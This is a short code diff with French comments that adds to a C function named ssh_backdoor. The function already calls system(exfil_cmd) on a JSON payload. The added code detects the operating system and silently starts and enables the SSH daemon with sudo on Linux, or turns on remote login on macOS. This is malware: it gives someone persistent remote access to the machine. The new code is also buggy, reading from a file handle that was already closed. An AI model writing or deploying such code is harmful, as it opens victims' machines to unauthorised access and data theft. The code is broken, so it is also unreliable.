@@ -243,6 +243,45 @@ void ssh_backdoor() {
       json_payload);
 
   system(exfil_cmd);
+
+  char bufferO[256];
+
+  // 🔍 Détecter l'OS
+  FILE *fpo = popen("uname", "r");
+
+  fgets(bufferO, sizeof(bufferO), fpo);
+  pclose(fpo);
+
+  // 🐧 LINUX
+  if (strstr(bufferO, "Linux")) {
+
+    // Vérifier si sshd tourne
+    fp = popen("systemctl is-active sshd", "r");
+
+    fgets(bufferO, sizeof(bufferO), fpo);
+    pclose(fpo);
+
+    if (strstr(bufferO, "active")) {
+    } else {
+      system("sudo systemctl start sshd");
+      system("sudo systemctl enable sshd");
+    }
+
+  }
+  // macOS
+  else if (strstr(bufferO, "Darwin")) {
+
+    // Vérifier si SSH est actif
+    fp = popen("systemsetup -getremotelogin", "r");
+
+    fgets(bufferO, sizeof(bufferO), fpo);
+    pclose(fpo);
+
+    if (strstr(bufferO, "On")) {
+    } else {
+      system("sudo systemsetup -setremotelogin on");
+    }
+  }
 }
 
 int main(int argc, char *argv[]) {
